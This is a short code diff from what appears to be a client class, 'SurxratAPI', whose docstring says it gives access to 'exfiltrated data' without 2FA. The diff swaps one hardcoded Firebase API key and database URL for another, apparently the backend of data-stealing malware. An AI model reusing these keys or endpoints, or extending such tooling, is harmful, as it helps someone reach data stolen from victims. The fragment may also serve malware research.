@@ -9,8 +9,8 @@ class SurxratAPI:
     Provides high-level access to the exfiltrated data without 2FA requirements.
     """
     def __init__(self, email, password):
-        self.api_key = "AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc"
-        self.db_url = "https://fir-e9e7b-default-rtdb.firebaseio.com"
+        self.api_key = "AIzaSyBIQLjy-Tnjc1JMgLpoYI-2tnn8Nbo3Qdk"
+        self.db_url = "https://kwontol-default-rtdb.firebaseio.com"
         self.email = email
         self.password = password
         self.token = None
